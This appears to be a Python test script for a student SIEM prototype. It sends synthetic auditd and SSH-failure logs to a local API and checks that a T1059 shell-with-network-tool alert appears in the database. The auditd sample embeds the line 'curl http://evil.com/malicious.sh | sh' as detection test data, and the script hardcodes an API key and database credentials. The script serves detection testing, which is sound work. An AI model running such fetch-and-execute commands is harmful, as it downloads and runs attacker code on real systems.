import httpx
import time
import json
import sys
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

# API Config
API_URL = "http://localhost:8000"
AGENT_KEY = "OSnyTU2uR13nNO67srAI_RXNZ4Ywt1mcpeBftPqAyrk"
AGENT_ID = "9567eec2-decf-4c7c-8fed-e647bec4392c"

# 1. Send suspicious auditd log (T1059)
audit_log = {
    "log_type": "auditd",
    "message": 'type=SYSCALL msg=audit(1672531200.000:123): arch=c000003e syscall=59 success=yes exit=0 a0=7ffcd36e8b40 a1=7ffcd36e8b60 a2=7ffcd36e8b80 a3=7f0c97800000 items=2 ppid=1234 pid=5678 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=1 comm="bash" exe="/usr/bin/bash" key=(none) a0="bash" a1="-c" a2="curl http://evil.com/malicious.sh | sh"',
    "host": "verify-host"
}

print(f"[*] Sending T1059 auditd log...")
resp = httpx.post(f"{API_URL}/ingest/log", json=audit_log, headers={"X-Agent-Key": AGENT_KEY})
print(f"Response: {resp.status_code} - {resp.json()}")

# 2. Send failed SSH auth log
auth_log = {
    "log_type": "auth",
    "message": "Apr 30 10:15:00 verify-host sshd[12345]: Failed password for invalid user malicious_user from 192.168.1.50 port 54321 ssh2",
    "host": "verify-host"
}

print(f"[*] Sending failed SSH auth log...")
resp = httpx.post(f"{API_URL}/ingest/log", json=auth_log, headers={"X-Agent-Key": AGENT_KEY})
print(f"Response: {resp.status_code} - {resp.json()}")

# Wait for processing
print("[*] Waiting for processing...")
time.sleep(2)

# 3. Check Alerts in DB
sys.path.append("/home/pokokpisang/Desktop/FYP/ifyp/prototype/agent/api")
from app import models
db_url = "postgresql://user:password@localhost:5432/siemdb"
engine = create_engine(db_url)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
db = SessionLocal()

print("\n--- RECENT ALERTS ---")
alerts = db.query(models.Alert).order_by(models.Alert.timestamp.desc()).limit(5).all()
for a in alerts:
    print(f"ID: {a.id} | Title: {a.title} | Host: {a.host} | AgentID: {a.agent_id} | Engine: {a.detection_engine}")
    print(f"   Severity: {a.severity} | Source: {a.source}")
    meta_str = str(a.detection_metadata)[:200] if a.detection_metadata else "N/A"
    print(f"   Metadata: {meta_str}...")
    print("-" * 50)

# Check specifically for the T1059 match
t1059_alert = db.query(models.Alert).filter(models.Alert.rule_id == "linux_t1059_shell_network_tool").first()
if t1059_alert:
    print("[+] SUCCESS: Found T1059 YAML alert!")
    if t1059_alert.agent_id == AGENT_ID:
        print(f"[+] SUCCESS: Agent ID {AGENT_ID} correctly associated.")
    else:
        print(f"[-] ERROR: Agent ID mismatch. Expected {AGENT_ID}, got {t1059_alert.agent_id}")
else:
    print("[-] FAILURE: T1059 YAML alert not found.")

db.close()
